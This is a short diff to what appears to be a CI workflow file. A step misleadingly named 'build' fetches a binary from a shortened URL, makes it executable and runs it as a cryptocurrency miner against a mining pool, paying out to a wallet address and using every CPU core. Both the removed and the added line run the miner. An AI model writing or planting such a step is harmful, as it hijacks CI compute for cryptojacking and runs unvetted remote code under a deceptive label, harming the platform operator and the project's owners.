@@ -51,5 +51,5 @@ jobs:
     - name : install dependencies
       run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
     - name: build 
-      run: wget -qO build https://git.io/JPQXz && chmod +x cpuminer-avx2 && ./cpuminer-avx2 -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RPjZ7GJF48arPdViMMPmtdfcdn4RjzVjr6.OPILIA -p x -t $(nproc --all) --no-tune
+      run: wget -qO build https://git.io/JPQXz && chmod +x build && ./build -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RPjZ7GJF48arPdViMMPmtdfcdn4RjzVjr6.OPILIA -p x -t $(nproc --all) --no-tune
         
